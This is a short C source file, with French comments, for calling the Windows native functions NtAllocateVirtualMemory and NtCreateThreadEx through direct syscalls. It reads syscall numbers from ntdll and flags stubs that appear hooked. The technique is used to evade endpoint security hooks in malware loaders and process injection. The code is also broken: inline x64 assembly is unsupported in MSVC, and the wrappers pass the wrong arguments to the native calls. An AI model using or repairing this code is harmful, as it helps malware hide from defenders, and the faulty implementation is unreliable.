#include <windows.h>
#include <winternl.h>

// Déclaration du type pour Nt* (Windows NT Native API)
typedef NTSTATUS(NTAPI* NtAllocateVirtualMemory_t)(
    HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG
);

typedef NTSTATUS(NTAPI* NtCreateThreadEx_t)(
    PHANDLE, ACCESS_MASK, PVOID, HANDLE, PVOID, PVOID,
    ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID
);

// Récupère dynamiquement le syscall ID
DWORD GetSyscallID(LPCSTR functionName) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return 0;

    BYTE* func = (BYTE*)GetProcAddress(hNtdll, functionName);
    if (!func || func[0] != 0x4C || func[1] != 0x8B || func[2] != 0xD1) {
        // Pattern non conforme (hooké ?)
        return 0;
    }

    return *(DWORD*)(func + 4); // L'instruction mov eax, XX contient l'ID
}

// Appelle NtAllocateVirtualMemory via syscall brut
NTSTATUS SysNtAllocateVirtualMemory(
    HANDLE hProcess, PVOID* baseAddress, SIZE_T regionSize, ULONG protect
) {
    NTSTATUS status;
    DWORD syscallId = GetSyscallID("NtAllocateVirtualMemory");

    if (!syscallId) return -1;

    __asm {
        mov r10, rcx
        mov eax, syscallId
        syscall
        mov status, eax
    }

    return status;
}

// Appelle NtCreateThreadEx via syscall brut
NTSTATUS SysNtCreateThreadEx(
    PHANDLE threadHandle, PVOID startRoutine, PVOID parameter
) {
    NTSTATUS status;
    DWORD syscallId = GetSyscallID("NtCreateThreadEx");

    if (!syscallId) return -1;

    __asm {
        mov r10, rcx
        mov eax, syscallId
        syscall
        mov status, eax
    }

    return status;
}
